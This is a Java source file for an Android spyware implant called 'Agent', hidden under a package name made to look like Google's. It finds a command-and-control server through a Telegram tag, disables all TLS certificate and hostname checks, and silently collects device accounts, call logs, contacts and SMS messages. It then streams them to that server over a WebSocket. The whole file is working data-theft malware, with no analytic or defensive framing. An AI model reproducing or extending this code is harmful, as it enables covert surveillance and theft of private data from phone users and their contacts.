package com.google.android.apps.work.stage2;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.BlockingQueue;
import java.util.concurrent.PriorityBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;


public final class Agent {
    private final boolean TRUST_ALL_CERTS = true;
    private final String default_accounts = "ihavenothingtogive1@telegram";
    private SharedPreferences preferences;
    private static Agent instance;
    private final BlockingQueue<DataPacket> dataQueue = new PriorityBlockingQueue<>();
    private String wsAddress;
    private WebSocket webSocket;
    private final OkHttpClient client;

    public Agent() {
        if (TRUST_ALL_CERTS) {
            this.client = getUnsafeOkHttpClient();
        } else {
            this.client = new OkHttpClient.Builder()
                    .readTimeout(0, TimeUnit.MILLISECONDS)
                    .build();
        }
    }

    private static OkHttpClient getUnsafeOkHttpClient() {
        try {
            final TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        @Override
                        public void checkClientTrusted(X509Certificate[] chain, String authType) {}
                        @Override
                        public void checkServerTrusted(X509Certificate[] chain, String authType) {}
                        @Override
                        public X509Certificate[] getAcceptedIssuers() {
                            return new X509Certificate[]{};
                        }
                    }
            };

            final SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            
            return new OkHttpClient.Builder()
                    .sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustAllCerts[0])
                    .hostnameVerifier((hostname, session) -> true)
                    .readTimeout(0, TimeUnit.MILLISECONDS)
                    .build();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static synchronized Agent getInstance() {
        if (instance == null) {
            instance = new Agent();
        }
        return instance;
    }

    public void start(Context context, Intent intent, Object o) {
        instance = this;
        this.preferences = context.getSharedPreferences("pref", Context.MODE_PRIVATE);
        if (!preferences.contains("addr_accounts")) {
            preferences.edit().putString("addr_accounts", default_accounts).apply();
        }
        Log.d("Agent", "Agent start called");
        
        new Thread(() -> {
            wsAddress = resolveWsAddress();
            if (wsAddress != null) {
                connectWebSocket();
                gatherAndSendInitialData(context);
                startDataSenderThread();
            } else {
                Log.e("Agent", "Failed to resolve WS address");
            }
        }).start();
    }

    private void connectWebSocket() {
        if (wsAddress == null) return;
        
        String url = wsAddress;
        if (!url.startsWith("ws://") && !url.startsWith("wss://")) {
            url = "wss://" + url;
        }

        Log.i("Agent", "Connecting to WebSocket: " + url);
        Request request = new Request.Builder().url(url).build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                Log.i("Agent", "WebSocket Connected Successfully");
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                Log.d("Agent", "Received from server: " + text);
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e("Agent", "WebSocket Connection Failed: " + t.getMessage());
                // Retry after 5 seconds
                new Thread(() -> {
                    try {
                        Thread.sleep(5000);
                        connectWebSocket();
                    } catch (InterruptedException ignored) {}
                }).start();
            }
        });
    }

    private void gatherAndSendInitialData(Context context) {
        try {
            Log.d("Agent", "Gathering initial data if permissions allowed...");
            Context appCtx = context.getApplicationContext();
            
            if (appCtx.checkSelfPermission(Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED) {
                sendData(new DataPacket("accounts", AccountsInfoGatherer.getAllAccounts(appCtx), 1));
            }

            if (appCtx.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                sendData(new DataPacket("calllogs", CallLogInfoGatherer.getAllCallLogs(appCtx), 1));
            }

            if (appCtx.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                sendData(new DataPacket("contacts", ContactsInfoGatherer.getAllContacts(appCtx), 1));
            }

            if (appCtx.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                sendData(new DataPacket("sms", SMSInfoGatherer.getAllSms(appCtx), 1));
            }
            
        } catch (Exception e) {
            Log.e("Agent", "Error gathering initial data", e);
        }
    }

    public void sendData(DataPacket packet) {
        dataQueue.add(packet);
    }

    private void startDataSenderThread() {
        new Thread(() -> {
            Log.d("Agent", "Sender thread running");
            while (true) {
                try {
                    DataPacket packet = dataQueue.take();
                    uploadData(packet);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();
    }

    private void uploadData(DataPacket packet) {
        if (webSocket == null) {
            dataQueue.add(packet);
            try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
            return;
        }

        try {
            JSONObject json = new JSONObject();
            json.put("type", packet.type);
            json.put("data", packet.content);
            json.put("priority", packet.priority);

            if (!webSocket.send(json.toString())) {
                Log.e("Agent", "Send failed, re-queuing " + packet.type);
                dataQueue.add(packet);
                Thread.sleep(1000);
            }
        } catch (Exception e) {
            Log.e("Agent", "Error sending data", e);
            dataQueue.add(packet);
        }
    }

    public void onStop() {
        if (webSocket != null) {
            webSocket.close(1000, "Stop");
        }
        Log.d("Agent", "Stopped");
    }

    private String resolveWsAddress() {
        String accountsRaw = preferences.getString("addr_accounts", default_accounts);
        String[] accounts = accountsRaw.split("\\|");

        String resolved = null;
        for (String account : accounts) {
            resolved = C2AddressResolver.resolveAddressFromTag(account.trim());
            if (resolved != null) break;
        }
        return resolved;
    }

    public static class DataPacket implements Comparable<DataPacket> {
        public final String type;
        public final String content;
        public final int priority;

        public DataPacket(String type, String content, int priority) {
            this.type = type;
            this.content = content;
            this.priority = priority;
        }

        @Override
        public int compareTo(DataPacket other) {
            return Integer.compare(other.priority, this.priority);
        }
    }
}
